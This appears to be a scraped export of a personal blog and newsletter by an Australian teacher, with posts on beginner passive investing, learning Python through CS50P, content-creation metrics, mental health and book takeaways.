schedules, we create better working environments.\nYou Need 1000 True Fans, That\u0026rsquo;s It? Kevin Kelly author of The Inevitable published 1000 True Fans on his website. It\u0026rsquo;s an article arguing content creators don\u0026rsquo;t need millions of followers, but 1000. I couldn\u0026rsquo;t agree more.\nKelly explains today\u0026rsquo;s technology is connecting creators to fans like never before. Using simple math, $100 profit for 1000 fans equals $100,000, his argument becomes sound.\nThere\u0026rsquo;s no free ride in life, building an audience worth of 1000 fans takes effort and energy.\nThere\u0026rsquo;s no free ride in life, building an audience worth 1000 fans takes effort and energy.

I want to find my 1000 true fans, don\u0026rsquo;t you?\nMore Found Goodness 🎧 #484: Daniel Ek, CEO of Spotify — Habits, Systems and Mental Models for Top Performance.

This is primarily for Australian citizens; research your countries tax and investment-related laws respectively.\nPut Simply Investing is storing your cash in a different container to increase its value.\nCash and its value are separate; $1 AUD can have a value of $0.80 USD. Your single dollar has two values depending on the container it’s stored in.\nContainers, a.k.a. accounts, funds or assets include property, stocks, shares, commodities (gold, silver), crypto, international currency etc. The default container, a local bank account, stores money in your regions currency, e.g. AUD.\nThe problem leaving all your cash here is its value lowers due to inflation. Inflation is a global issue; governments print more money and rates rise forcing increased prices for goods and services. This all makes the value of our cash lower as we need more cash to pay for everything.\nAn example is the price of Coffee! It used to be a few dollars for a cup of joe, now it’s significantly higher for some hot water and ground beans. That’s inflation at work.\nThis is why we invest or store cash in different containers a.k.a. accounts or funds. Having a variety of containers is known as a diversified investment portfolio or wide asset allocation.\nYou need a good investment strategy to avoid inflation, increase the value of your money and cast a wide investment net.\nBut first, where are you, financially?\nYour Current Wealth Wealth or net worth is the total amount of your cash and investments. Open your banking app and if you already have investments, try WeMoney or Finder to easily combine multiple accounts into a single dashboard.\nThe biggest impact on your wealth is your income, that is, how much money you make. Be aware as tax and super also affect this.\nTax is money paid to governments so our country can operate. In Australia, there’s GST (Goods and Service Tax) on purchases, income tax, capital gain and a lot more. Superannuation (Super) is the retirement fund issued by the government handled by a third-party super fund or yourself.\nEither you’re self-employed or you’re employed by a company. Either way, you need to total your annual income.\nTo navigate your payslip:\nDisbursements: payment to funds like Super. Gross: your income before expenses aka before-tax. Net: remaining amount after expenses aka after-tax. An example of annual income: Gross amount is $76,102.00, take tax owed $16,796.00 which equals Net amount $59,306.00. Then take Disbursements of $2,891.98 out and you get the actual Banked amount of $56,414.02. And Employee Super is on top of $8,789.82.\nMindset Your income is the most important factor to a good investment lifestyle, so in saving that, income should be your focus. Mr. Money Mustache says to increase “your savings rate as a percentage of your take-home pay.”\nIt’s not about how much you earn, but how much you can save and invest from your earnings. A healthy savings mindset is a lifestyle. Assess what you have and see what changes you can make to increase how much you put away.\nCreate a simple budget spreadsheet to track everything, try Daniel Inskeep’s Budget Tracker. For more assistance with savings, I recommend The Barefoot Investor by Scott Pape.\nJohn C. Bogle, an investing legend (more on him later), follows this simple philosophy:\nKeep investing. Time is your friend. Impulse is your foe. Stay diversified. Stay the course. Fundamentals Now the fun stuff, investing hoo-ha.\nThere’s a lot of different investment strategies out there. Do your research before transferring your hard-earned money anywhere!\nFor passive investing, we’ll be using Dollar-Cost Averaging (DCA), a low risk, less volatile strategy.\nDCA is long term which rewards your time in the market over timing the market. Meaning, you’ll regularly invest cash no matter the ups and downs.\nHistorically, the market as a whole rises, so the longer you invest in proven containers the better results you’ll most likely get from compound interest.\nWarren Buffet, the famous investor, ran a 10-year bet to prove the DCA strategy. And ahead of schedule, he won the bet which proves to stay in the game longer, works!\nSo, how do you get started?\nStep 1, have your emergency fund, i.e. enough cash for 3-6 months to live. Multiple 1 month of living expenses by 3 and 6, add 5-10% on top as a buffer. Leave it in your default container, your bank account.\nStep 2, set some clear, focused goals, e.g. $100k or $100k-$200k to put toward a house. If you pair it with a strong, emotional purpose, you’re more likely to stick it out.\nStep 3, assess your financials. Know your income and outgoings to find the perfect weekly/monthly investment amount.\nStep 4, set a timeframe, i.e. the length of time you want to invest for, factoring age and objectives, typically 5-7 years as that’s one market cycle. And the amount of time available to manage investments week to week.\nStep 5, assess your risk, i.e. the willingness to risk losing money to generate a potentially higher return over the life of your investment. Be aware of behavioural traps and greed! Don’t let emotions get the better of investment opportunities. Pride, emotional attachment and loyalty are dangers for investing.\n## Stocks\nLet’s store cash in stock containers.\nA stock is a portion of a company, as the company grows the stock prices rise making our cash more valuable.\nWe’ll invest in shares via the stock market.\nThe stock market is the globally connected database organising all of the stocks for publically traded companies. Each country has their own Stock Exchange, in Australia, it’s the Australian Stock Exchange (ASX).\nInstead of a single stock in a single company, let’s look at Index Funds. Index means a group of companies, and Fund means an account of money. For example, the S\u0026amp;P500 Index is a Fund for the top 500 companies in the US.\nSo by investing $1, it will be split among 500 companies. You’ll own a small percentage of a small share of lots of different companies. Cool, hey?\nAli Abdaal’s Ultimate Guide to Investing in Stocks says to invest in index funds. Ali says it’s “the best way to invest in the stock market.” Daniel Inskeep’s Invest First $1,000 and Long-Term Stock Portfolio mentions ETFs (Exchange Traded Funds) are great. Andrei Jikh’s Revealing Investments, Start at 20, Retire by 30 and How Much Money Should I Invest are all worth exploring.\nAccounts To invest in stocks, you need a stock broker.\nA broker acts as a middle-man between you and your countries stock exchange. These days, this is all automated with programs and software, there’s no human middle-man.\nThink about it like buying a laptop. You don’t go directly to a factory where it’s made, instead, you go to an online/physical retail store. There’s an increase in the laptops price from the retailer as they make the purchase process possible.\nLike retail stores, there are many stock brokers to choose from, all with pros and cons. Two factors to consider are 1) the ability to invest in Index Funds or ETFs and 2) having low fees.\nDo your own research with terms like “best stock broker in \u0026lt;your country\u0026gt;”. Here’s Every ASX Stock Broker Comparison for you fellow Aussies.\nFor Index Funds and ETFs within Australia using dollar-cost averaging, the Vanguard Personal Investor platform is a good option, however, I recommend Pearler, see Vanguard vs Pearler for more. Vanguard Group is the second-largest investment firm in the world. Founded by John C Bogle, who’s credited with creating the first index fund.\nOkay, so how much do you transfer?\nYour first investment is daunting, but it’s up to you and your financial circumstances. Vanguard allows a minimum of $500 trades, so that’s your floor, you can only go up.\nThey integrate with Osko so set up automatic transfers for something like $125 per week (if you can) for $500 at the end of each month. Keep a steady investment habit whatever the amount is.\nPicking Index Funds What index funds do you pick?\nThere’s a lot of different Index Funds to choose from, even from one Stock Broker.\nDo your own research with terms like “Best Vanguard Index Funds”.\nTo start, look at 1) Vanguard Australian Shares Index ETF (VAS.ASX) and 2) Vanguard MSCI Index International Shares ETF (VGS.ASX). The VGS is similar to the S\u0026amp;P500 mentioned earlier.\nDavid Quan’s Low-Cost Index Funds and Sanjee Sen’s Favourite ETFs show these are worth exploring.\nLong Term Thinking Dollar-cost averaging rewards steady, long-term investing, perfect for your passive income dreams.\nWhile crypto rises and crashes, you’ll slowly feed your Vanguard account and smile.\nWith the extra time you have, keep learning from the best. Read The Barefoot Investor and use resources like Vanguard’s blog: Don’t just plan for retirement; Plan for your life and /r/learnfire’s members: 1 Million Mark or Prioritise Spending. Also, try Profitful Investing Community and the Morning Brew.\nExample Strategy 🚀 Strategy: Dollar-cost averaging.\n⏱️ Timeframe: 5 years.\n🎯 Goal(s):\nLower paid tax. Invest Super more aggressively. Earn at least x4 amount invested stocks from index funds. 💰 Financial Position (annually):\nIncome: $76k pre-tax, $56k post-tax. Outgoing: ~$36k Cash Savings: ~$10k Super: ~$10k 💡 Emergency Fund: $12-16k\n⌛ Investable Time:\n10-15mins per month. Ideally full automation. ⚠️ Risk Tolerance: Low.\nDay Trader Experience For a wider perspective, I phoned a family friend.\nHe’s a day trader and treats the stock market as a job. His focus is the resource/material sector like gold, oil and gas.\nHis advice is to find a sector you enjoy learning about in order to understand when stock prices rise and fall. It took him 15 years to comfortably bid and sell lots of money as he now understands what’s happening in his sector of choice.\nStarting out was stressful he explained, he had many sleepless nights worrying about the latest investment and if it would pay off. He’s now recovered his losses and earned a lot more money, but he still warns to be very careful.\nDay trading is a high risk, needs a large amount of time and requires insight from experience.\nHe explained managed funds is a great starting point compared to self-managed. He also mentioned Captial Gains Tax, the “difference between what it cost you to acquire the asset and what you receive when you dispose of it.” And how it halves over a years time, so hold on to investments for over a year! He also explained something called Medium Terms, which I didn’t understand, will look it up soon.\nIt was a great conversation that shows investing is different for everyone.\nWhat a ride! I wish you the best on your investment journey and hope this helped in some small way.\nEmail or tweet me if you’d like to share your journey, I’d love to see it!\nThank you to:\nAli Abdaal Daniel Inskeep Andrei Jikh David Quan Sanjee Sen My family friend Next up… crypto, real-estate or maybe single stocks and shares, stay tuned!\n","permalink":"//localhost:1313/passive/","summary":"You’re probably like me, wanting to understand the terms ‘wealth’ and ‘investing’.\nHow does everyone else have this investment thing figured out?\nLet’s do a bit of research and look into investing!\nDisclaimer, I’m not a financial advisor, seek professional financial advice, this is for entertainment purposes only.

Let\u0026rsquo;s look at the Key Point Indicators (KPIs) in a bit more detail.\nNewsletter friends: 200 (+6%) - hit the double hundred mark, this was the yearly target so happy to hit it this soon. I love writing my newsletter month to month, but find the lack of engagement a bit discouraging tbh. YouTube subscribers: 496 (+18%) - just under five hundred, already surpassed the yearly goal of four hundred. So far, it’s been really fun getting comments and watching more people enjoy the videos, keen to do more throughout the year. Blog views, visitors: 1150 (-36%), 612 (-12%) - after a steady increase, the blog has dipped in the last 2-3 months. I’m unsure why, I’m not sure if it’s just from the tracking software and web caching clashing as I’ve had this issue in the past. Whatever the case, I’m trying to not worry too much about numbers lowering. The largest referrer month to month is always Google Search, by far. While uploading more videos to YouTube, I have seen this as my second top referrer to the blog, which makes sense as the first and second most popular search engine. All up, I’m very proud of sharing what I learn each week/month via my channels. I know it ain’t much, but it’s honest work.\nCatch-Up \u0026amp; Next Steps Months Memories\nI met my work colleagues for the first time IRL after 1.5yrs… can confirm they are real. My wife and I had a couple of rough weeks from the flu, I’m better but my poor wife is still sick. I’ve procrastinated CS50P, currently, weeks 9 of 10 and see no hope, please help me. We’ve spent more time with family this month, it’s been really nice hanging out with them all. I published Object Orientated Programming and Automate Python Practice Projects. Consumed Content\nBook: Gold 2.0 Opening The Vault - yes, I’m looking into crypto, do not scam me. Articles: PyScript Tutorial, Compulsion of doing everything, David Malan’s Docker Containers, ASIC Crush Creators, and Fall Of Reddit. Videos: AMA w/ David Malan, No, it’s no Sentient, Al Sweigart Interview, You’re Not Stupid, Feeling Tired, Coding Truths, VICE’s ALL GAS and Birds, DEFCON Challenge, and Grant’s Imposter Syndrome. Podcasts: HIBT Paypal Part 2, and Huberman Lab Boost Attention. Next Month\nContinue CS50P, and start the final project. Get back into YouTube. I know everyone says it, but time is really going by so fast. I hope you’re doing well and having a good, productive year so far. Question, what do you want to do before 2023? And what are you doing about it?\nKind regards,\nAsh\n","permalink":"//localhost:1313/check-in/","summary":"Hi friend,\nWe\u0026rsquo;ve passed 2022’s halfway point, how about a check-in?

Disclaimer, this newsletter is from Mr Ash.co, as you subscribed or downloaded a freebie. Read online or listen here, enjoy!\nThe Learning Dilemma Professional Development (PD) is important in education, in a way, its my job to learn. I typically focus on a course or project to learn new skills or sharpen existing ones.\nCurrently, I\u0026rsquo;m learning Python, a flexible, popular programming language with a beginner friendly design. I\u0026rsquo;m learning via the online, self-paced CS50P course from Harvard. It spans 11 weeks with susinct lectures and challenging problem sets, oh and it\u0026rsquo;s 100% free. For help, there\u0026rsquo;s a discord server to ask educators and students.\nWhats the dilemma? What\u0026rsquo;s so difficult?\nIt, got, hard, and, boring. One particular week wasn’t interesting like the previous weeks. It\u0026rsquo;s a pretty bad excuse of a learning dilemma, but I think its an important one.\nHere\u0026rsquo;s how I\u0026rsquo;m combating the dilemma:\nWriting this public newsletter. Sharing problem set advice via the blog. Tweeting some progress. Just keep going. It\u0026rsquo;s simple in the end, to not stop, to continue when it\u0026rsquo;s hard and/or boring. Sometimes there\u0026rsquo;s no ’hack’ or special trick, it\u0026rsquo;s just heads down and study.\nCatch-Up \u0026amp; Next Steps Looking back on May and forward to June.\nMonths Memories\nAnother spin around the sun for me, I\u0026rsquo;m a year older @27, so wise. I started and (sort of) finished my first collaborative python programming project. This tweet shared PyScript, a new way to use Python in web pages. Mike Driscoll, a prominent Python Educator retweeted my website. I got Recut by Dave Ceddia, it automatically cuts silence from audio and video files. We hired one of my good friends at work, its great to be working along with him! No new content either articles or videos this month, having a break.

An Epic 2021 w/ Khe Hy I first found Khe Hy on a Deep Dive from Ali Abdaal, it took me weeks to come back and finish that video off! I’m a fan of Khe’s method of giving 99% away for free and just a select 1% will pay. It’s a very ‘Company of One’ approach to business.\nHis latest value give away is the 10k institute’s Roadmap for an Epic 2021.\nA 5 day LIVE course that’s just wrapped up. Unfrountally I couldn’t attend the sessions live due to location timing, they’re on at 2 am AEST here.\nHere’s a few takeaways from Day 0 and 1 as I’m still catching up on the lessons.\nMeaningful outcome by balancing the following: 1) Self-awareness 2) Tools: Cutting edge software/hardware \u0026amp; 3) Behavior change: Make it effortless. Unifying life framework: 1) Tasks, habits \u0026amp; notes 2) Projects, domains 3) Goals 4) Intentions. Check out the Roadmap for an Epic 2021 course.\n2. YouTube Crash Course w/ Ali Abdaal Speaking of Ali Abdaal, he’s also giving away a free short course. Not as involved as Khe’s but a great starting point for an aspiring YouTuber (like me).\nHere are the first three days of the course (I’m still waiting for the last two):\nReasons why YouTube works. Myths about YouTube. Productivity tips for YouTubers. “There are no unique messages. Only unique messengers. – Ali Abdaal\n3. Children \u0026amp; Business I published my latest blog post 6 Lessons Children Teach Us About Business. Here’s a snippet:\nA great teacher once said to be like children. How well does that apply to life through business? Here’s a deep dive into growing brain activity, personal experience and observations.\nI’ve discovered five lessons children teach us about business. This article will cover:\nLook Ahead with Wonder.

It was a great getaway before lockdown struck.\nLet\u0026rsquo;s look at once been cooking.\n1. Personal Finance My longest blog post is live and is ready for your viewing pleasure.\nIt\u0026rsquo;s on finance, a topic that\u0026rsquo;s never tickled my fancy (if you know what I mean).\nBut now being in my mid-twenties \u0026lsquo;finical independence\u0026rsquo; is filling up my search history.\nI blame Scott Pape and his shoe-less attitude toward life.

Crypto, foreign exchange, single shares\u0026hellip; opportunity and traps are blurred.\nBe careful out there! Never send your hard-earned cash ANYWHERE unless it\u0026rsquo;s a validated, reliable source.\n2. Professional Development I feel like I have two jobs 1) being a teacher in education, and 2) a network admin in tech.\nThis creates an ongoing issue.\nIf I\u0026rsquo;m a teacher first, how do I improve my tech skillset second?\nEnter, Professional Development (PD), you may/may not have this in your workplace depending on your job.\nFor teachers, it\u0026rsquo;s massive!\nIn order to stay current with the tech industry, I go to webinar\u0026rsquo;s, consume content (YouTube, email, Podcasts), participate in events, take courses and create content.\nSome weeks I do a lot of PD, some next to none. For me, it depends on the workload and mental health.\nIf I\u0026rsquo;m overworked and stressed, the extra time I have is spent relaxing and enjoying time with my wife.\nHow much PD should a teacher do to stay current? Reply and let me know.\n3. Identity Crisis Help please, I\u0026rsquo;m in an identity crisis with mrash.co.\nSince learning Cyber Security with #100DaysOfHacking. The blog has over 10 posts about hacking, Linux and Cyber Sec.\nBut what about web design, WordPress and Elementor?\nThese topics are what I started as there are ~30 videos on YouTube about them.\nNow I don\u0026rsquo;t do web design and I\u0026rsquo;m afraid to make videos about anything else as it will conflict.\nWill it conflict?\nI want to have the ability to make content about a wide range of topics, not just a few.\nBut I also don\u0026rsquo;t want to confuse viewers.\nIs that possible? Reply and tell me as I don\u0026rsquo;t know yet.\nEither way, here\u0026rsquo;s a short-list of what I\u0026rsquo;ve made in the past 2-3 months:\nHackers Beginner Guide To Online Anonymity Beginner’s Guide To Passive Investing – Income, Tax, Super, Stocks And ETFs WordPress App Won’t Connect To Website – Cloudways Self-Hosted Linux Unhatched Cisco Course Review And Notes Kind regards,\nAsh\nP.S.

I know I do and we all do at some stage in our lives.\nMaybe you find it difficult to get help or even embarrassing. Please don\u0026rsquo;t, if you need help, just talk to someone. Asking for help and receiving it can be life changing and even life saving.\nSince April I’ve been feeling lost, I’d have a few good days and then some bad. But I found the window between the good days and bad we\u0026rsquo;re shortening, I was feeling worse more often.\nSo I reached out to a free, professional councilor. Here’s what I learnt:\nTalking to a professional isn’t a big deal and it\u0026rsquo;s not embarrassing. It doesn’t have to be a long-term, ongoing conversation. You don’t have to trudge up your entire life and go through your childhood. Talking to someone outside of your life is empowering and motivating. There\u0026rsquo;s a “snowball effect” from talking, I\u0026rsquo;ve felt lighter and had less brain fog. As someone who suffers from imposter syndrome, low self-esteem and social anxiety, I can say “getting help” helps.\nIf you need to talk to a professional, search “I need to talk to someone” or “professional councillors near me” to see local results to you and your country. If you just want to chat, my inbox is always open.\nCatch-Up \u0026amp; Next Steps Months Memories\nMy wife and I started Hello Fresh. Weekly recipes delivered to our door all proportioned and ready to cook. So far we\u0026rsquo;re loving it, sure it\u0026rsquo;s more expensive but it\u0026rsquo;s helping us eat and cook better. My little (6.7ft) bro-in-law started playing basketball. It\u0026rsquo;s fun going back to the court I played at when I was younger. Work was busy as usual, we have new classes every 6-8 weeks. I started creating videos for my units and updated our graphics. I finally finished CS50P, the single hardest course I\u0026rsquo;ve ever got through. It\u0026rsquo;s been quite the learning journey, here’s my final project submission. Replit held a EdFest 2022 event, which had the likes of David Malan (CS50) and Qunicy Larson (freecodecamp). It was awesome so I submitted a course outline to their curriculum jam here. Since CS50P, I\u0026rsquo;ve started putting my Python skills to work building web apps with PyScript. So far I\u0026rsquo;m 3 projects deep, all are still a work in progress. 1) Mailto Me, 2) LightShot Leaks and 3) I Was There. I\u0026rsquo;d love feedback on any one or all of them!

Bitter as we’ve loved our time relaxing at home, sweet as we’re looking forward to the routine work brings.\nHere’s awesome content that I’ve learnt from this week.\n1. Stay Small with Scalable Systems I’ve wasn’t a big reader growing up but I’ve learnt how valuable it is over the last two years. It’s lead me to reading more books then I’ve ever read in my life, even if it takes me ages.\nI’m up to chapter 8 in the Company Of One, which is about simple and repeatable systems to facilitate scale in business.\nHere are a few notes:\nTechnology like social media \u0026amp; newsletters create one-to-many relationships. They require same the effort for one email to one person as an email to 50,000 people. Products that take little/no management \u0026amp; charge one-time fee. Creation / connection as a scalable system. Don’t choose profits over people, shift toward slower, smaller, on-demand strategies e.g. slow fashion. Build relationships, trust and revenue giving ‘on-demand” information OR increase customer education/retention. This chapter has reassured me how smart growth is possible by approaching business systematically. Breaking larger tasks down into steps becomes a more valuable skill as businesses change.\n2. Burn Bad Habits and Feed Good Goals My brother-in-law recommended ‘Burn Fat, Feed Muscle’ by Tom Venuto. I’ve ignored fitness books/content due to insecurities and negative thinking. I’m so thankful I was shown this book, it’s an absolute treasure!\nI’ve listened to ‘Chapter 6: Setting Goals and Training Your Mind’ nearly four times! I have a fascination with our mind’s power and those who tap into it. I believe we all have high achieving qualities in us, we simply need to unlock them.\nHere are three steps to set goals and unlock your high achievement.\nSet ideal goals : Your dreams, hopes and the seemingly unrealistic future you, e.g. I want to have a fit, tone body and be proud of what I look like. Write goals as affirmations : Turn them into first person, current realities for your subconscious e.g. I have a fit, tone body and I’m proud of what I look like. Read aloud every day: Each morning and night, say your ideal goal as an affirmation to yourself. Overtime we build habits from what we tell ourselves, i.e. we follow what we think. It’s time I (we) start thinking toward my ideal future self and achieve what I really want in life.\n3. Being Human via Good Tape If you didn’t know, I unintentionally started a podcast from writing blog posts. I wanted to give readers an option to listen which naturally lead to them being audio episodes.\nIt’s a goal I’ve always put off but not anymore! As per usual, I deep dive into subjects to understand them. This takes form in finding and consuming a lot of content.\nI started at my podcast host who provided two free courses, they were good introductions. That lead to finding Spotify’s resources for podcasters and their Gimlet Academy. That was perfect!\nHere’s an over simplifed breakdown of the Gimlet Academy:\nPitch: Perfecting the ‘why’ by giving people a reason to care.

Reply and tell me one nice thing that you experienced.\nMy week has been good. It’s the second last week of the holidays! I’ve loved creating more content over this time. But I’m worried about going back to work and balancing the goals I’ve set for myself.\n1. Ultimate Lessons From Tim Ferris How I Built This interviewed Tim Ferris, entrepreneur/author of The Four Hour Work Week. Ferris is living proof anyone can achieve greatness and define success. I learnt how hard work pays off. Tim endured struggle after struggle and repeatedly solved problems. Here are snippets from his interview.\nDon’t convince the world, convince the people who match closely to what you provide. It’s not about the number of people that don’t get it, is about the number of people that do get it. Burn out is real, don’t be a bottleneck and overload yourself. The objective isn’t to have money, the objective is whatever you trade the money for. Change involves hard thinking, but sometimes easy implementation. i.e. fire clients, better policies/processes. Follow curiosity, learn new skills. Learning skills has a blueprint; study, practice, review, repeat. The Four Hour Work Week book was turned down nearly 30 times. Each failure was an opportunity to get better, and the pitch did. Time isn’t a renewable resource, money is. Listen to everyone and share intent when asked, tell half-story to entice, if asked more tell more, if still interested, offer something unique. Practice and train techniques to do what you can’t do now, what’s impossible. Anyone can learn new skills and apply a good system, find the system. 2. Be Personal Paul Jarvis (took his website down?!) clearly explains the benefits of being personal in your business. Something I often avoid as a lot of personal acts don’t scale and can’t be automated. I learnt that it’s okay. Doing kind acts to show your customer/audience that you care is the best way to get more business. You feel good to help, plus you can increase profit overtime. It’s a win-win.\nKeeping an existing customer is easier than acquiring a new one. Creates brand evangelist s, treat customers like friends. Exceed expectations from acts that don’t scale and building reciprocity (customers get unexpected help). Helping your customers as individuals requires as much empathy. Listen and understand immediate needs and bigger picture aspirations, companies often DON’T put customers first, this gets noticed. Customer happiness is the new marketing, is easier starting small to provide personal touches. A successful customer has the financial means to continue to support your business. Mutually beneficial and long-term succeeds when its customers succeed. Customer size didn’t matter, they spread the word, they grow over time, they can become more profitable. Adapt to feedback, write new sales pitches, update branding on what customer wants/needs. Company of One\n3. Some Forever-Life Skills My brother shared a video from Jim Kwik with me. At first, the thumbnail and title put me off. It seemed a bit pretentious and “preachy”. But it was from my bro, so I gave it ago. Wow! I learnt the brain states and ways to take advantage of them. Also, it’s the second time this week I heard someone quote from a book called ‘7 Habits of Highly Effective People’, which is now on my to-read list.\nHere are my takeaways from the video:\nSit/stand up, don’t slouch or lay down. We do brain fog \u0026amp; fatigue, we don’t have them. Collapsing oxegyn access to brain by slumping over. Win the day, win the first hour. Don’t do: 1) Digital overload: Too much info, not enough time. 2) Digital Dementia: outsourcing our brain activity. 3) Digital distraction: don’t pick up the phone within the first hour of the day. Have a Not-To-Do List. Multitasking is task-switching with a dopamine rush. Remove social media to remove distraction triggers. Be proactive, not reactive. Brain states. 1) Beta: When you’re awake. 2) Delta: When you’re sleeping. 3) Thelta: Just before sleep, when you’re creative. 4) Alpha: Relaxed awareness. Meditate e.g.trance of television. Consciousness is set aside. Thanks for reading!\nHere’s a few other things that have happened throughout the week.\n❤ Kindness Diaries is my new found fav show on Netflix. My wife and I are loving it at the moment. It’s regularly making me rethink how I talk to people, how I help and what I can do more of. It’s a moving show which demonstrates the true power of kindness.\n🚗 Rocket League has been my goto for instant fun. I’ve been playing a lot over the holidays.\n😇 Wonder Woman 1984 was a fun popcorn flick to watch. If you can get out to the movies where you are, it’s worth your time. Pedro Pascale was so much fun to watch as a baddy!\n🆕 Now Page is a new addition to my website.

Wow time moves fast.\nShare your work in progress Let me introduce you to Marc, he\u0026rsquo;s from the Netherlands. He\u0026rsquo;s a founder of platforms such as WIP (Work In Progress), a community for other makers to share what they\u0026rsquo;re building.\nHe enjoys seeing the process of people creating so much that he\u0026rsquo;s built a thriving online platform around it. Plus a large community of makers are supporting WIP so Marc can reinvest in building what he loves.\nHe gave a great interview with Hackernoon where he said something that really resonated with me in regards to building his platform, “I also started noticing something interesting about my own productivity: if I would share my work early in the process, it would be much more likely to be successful than when I waited for it to be done.”\nIt\u0026rsquo;s so true.\nThe sooner you share, the better odds you have of success. It adds accountability knowning that others are expecting something from you. Marc knows this and has built a great space on the internet for finding others like him.\nI encourage you to see his website and stay connected with him via Twitter or Instagram.\nHe might even review something from you too!\nVideo shoots and new opportunities It\u0026rsquo;s been a great week, I\u0026rsquo;ve learnt a lot and I\u0026rsquo;m looking forward to some new, unexpected opportunities… more on that soon.\nThis week I\u0026rsquo;ve been grateful for my family.

I encourage you to reach out to your loved ones and really be a listening ear.\nMake the people who you love feel loved, it\u0026rsquo;s incredible how small chats can turn into much needed conversations.\nA story from this week is about my new video from Focus Media Film (A***, the owner is a good friend of mine).\nIt\u0026rsquo;s been two weeks and we\u0026rsquo;ve been trying to organise a time to shoot a video for my freelance web design business.\nThe deal was, I\u0026rsquo;d do his website and in return he\u0026rsquo;d shoot and edit a video for me. Sunday rolled around and I knew if we post poned doing the video again, it\u0026rsquo;d be one of those projects we always put off.\nSo my wife and I got ready, went over to his place and began shooting. My wife is amazing at video and photo feedback, she knows what looks good when you don\u0026rsquo;t.\nAfter hours of discussing, trying, shooting, coffee, reshooting, more coffee and editing. A*** had a pretty funky video going, Shar tightened up a few clips and before we could finish A*** had to head to another shoot.\nA few days later and now I\u0026rsquo;ve got the finished video. Your sneak peak for being an awesome friend.\nHere\u0026rsquo;s what I\u0026rsquo;ve been working on this week…\nI finished my new clients website For The Loveee of Flowers. Jess is an amazing florist who enjoys crafting love stories through her flowers, and wow is she good at it! She actually did the flowers for our wedding, she\u0026rsquo;s amazing!\nTalking about sharing things earlier, I shared via Instagram some ideas for writing content. Having people in that early part of the process pushed me to deliver an article withing 24hrs, that\u0026rsquo;s a first for me! It\u0026rsquo;s all about how having a website will save you time and ultimately money.\nLastly!\nI\u0026rsquo;ve really been enjoying Instagram lately, through putting out regular stories and snapping some pics I\u0026rsquo;ve been noticed! A local creative agency who I really respect watched my stories. I reached out to them and not only did they reply, but they\u0026rsquo;ve booked a meeting with me for next week!

Warning, this letter is self-indulgent so if that’s not your thing, I understand, you can read the blog posts under Months Memories below.\nLet’s chat, I was really lazy this month, honestly, I had a tough week or two throughout April, my brain spiralled leaving me pretty lost. So I thought it’d be beneficial to explore the habit of laziness and how it impacts me and probably you too.\nDisclaimer, you’ve received this newsletter as you’ve subscribed to Mr Ash.co (or downloaded a freebie), if interested, read last month’s or see all newsletters.\nFeeling Lazy and Getting Lost Let me preface that I (like a lot of people) have an ongoing relationship/battle with laziness. Ever since I can remember I’ve almost always chosen the easier option over the more difficult one. If it was work, spending time with friends or whatever, “easy is best”\u0026hellip;. but is it?\nSimply put no it’s not always best for us. It’s like only eating chocolate, that’s not going to bode well for our health. So what happens if we continue taking the easy option in life?\nWell, that’s where I found myself because when I picked the easy option I was ignoring or procrastinating the more important things. Basically, I let laziness take the wheel and steer my brain leading me to feel lost and mentally down.\nWithout diving too deep, this isn’t my therapy session, otherwise, I owe you a lot of money. I spent the better part of an entire week or two feeling lazy, unmotivated and lost. I did the bare minimum work tasks and what was required of me, that’s it.\nBy the end of that week or so in April, I was fine, something in my brain wasn’t okay and I needed some time to rest. We all have bad days, sometimes weeks, months, or years, I think it’s inevitable to feel lost and be lazy so I think it’s important to:\nAccept you’re going to feel sad/down sometime. Don’t beat yourself up for being down, own up and move on. Talk to friends/family/anyone about how you’re feeling. Write your thoughts and see what’s going on in your brain. Take a bit of time out to rest up and chill out. Acknowledge you’re not invincible and a deeply flawed human. Be okay with not being okay, it’s okay. If you need to talk, just reply to this email, no judgment, just happy to help or listen, sometimes that makes a world of difference. If you’re struggling with laziness or procrastinating, I love watching Tim Urban’s TEDtalk The Procrastinator’s Mind. Otherwise, please let me know what helps you when you’re feeling lazy and lost.\nCatch-Up \u0026amp; Next Steps A quick look back at the month and forward to next.\nMonths Memories\nHad my first Personal Trainer (PT) session, I was nervous but I’m glad to work with a pro.

It’s been full of family gatherings and time spent with those closest. I hope it’s been the same for you. This issue is focused on looking inward. I’ve found the more we discover ourselves, the better we can contribute to others.\n1. Sit Down and Think We get bombarded with notifications. Social media and our devices stop us from being intentional. Our attention is a valuable resource we often waste.\n“Modern humans spend virtually no time on inward-directed thought.” Stop wasting your attention. Start looking inward at what’s most important. Let’s be more intentional with our actions.\n“All of humanity’s problems stem from man’s inability to sit quietly in a room alone” from Oliver Burkeman.\n2. Friendship Framework How many friends do you have? How close are your friends? Are all your friends at the same level? What makes someone a friend?\nWhat if we had a clear framework to think about this? A levelling system we could use for all friends.\nLevel D: Friendly, those we know and like Level C: Friends, ones we care about and enjoy their time Level B: Supportive Friends from our tribe/circle/network Level A: Emotional Friends, we’re safe to be our “lesser self” Derek Sivers used a throwaway term “level C, not level A friend” during an interview. Which sparked the idea I’m affectionately naming the Friendship Framework.\n3. The Hyper Freelancer The path to entrepreneur success is an ever-changing one. What works for me will be different for you, that’s the nature of success.\nThe Hyper Freelancer does a good job packaging one pathway.\nFreelance: Services/Consulting Educate: Online Courses Products: Digital Tools “… freelancers can thrive professionally by diversifying how they offer their unique expertise… three activities: consulting, education and building products.” – Ben Issenmann\nThank You For Reading This week I’ve been grateful for growth\nI’ve had the wrong view of growth, I’d get embarrassed when doing something wrong. That turned into negativity which stopped me from growing. What a waste of time!\nWhen I started to write, I realised my thinking was all wrong. Failing is an opportunity to learn. I’ve been daily journaling on and off since May of this year, 2020. That’s only a few months of writing.

